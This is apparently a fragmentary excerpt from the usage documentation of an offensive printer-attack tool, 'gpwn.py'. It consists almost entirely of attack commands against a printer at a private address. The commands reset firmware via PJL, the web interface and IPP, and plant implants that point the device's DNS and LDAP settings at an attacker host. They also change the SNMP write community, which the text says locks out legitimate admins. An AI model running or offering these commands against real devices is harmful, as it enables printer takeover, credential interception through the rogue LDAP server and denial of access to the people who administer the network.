...
```bash
python gpwn.py 192.168.1.100 --storage
```
...
```bash
python gpwn.py 192.168.1.100 --firmware
```
...
python gpwn.py 192.168.1.100 --firmware-reset pjl

# Via web interface (EWS) — HP, Ricoh, Canon
python gpwn.py 192.168.1.100 --firmware-reset web

# Via IPP (Brother, Kyocera)
python gpwn.py 192.168.1.100 --firmware-reset ipp
```
...
python gpwn.py 192.168.1.100 --implant dns=192.168.1.200

# Change SNMP write community (lock out legitimate admins)
python gpwn.py 192.168.1.100 --implant snmp_community=s3cr3t
...
python gpwn.py 192.168.1.100 --implant ldap_host=192.168.1.200
```
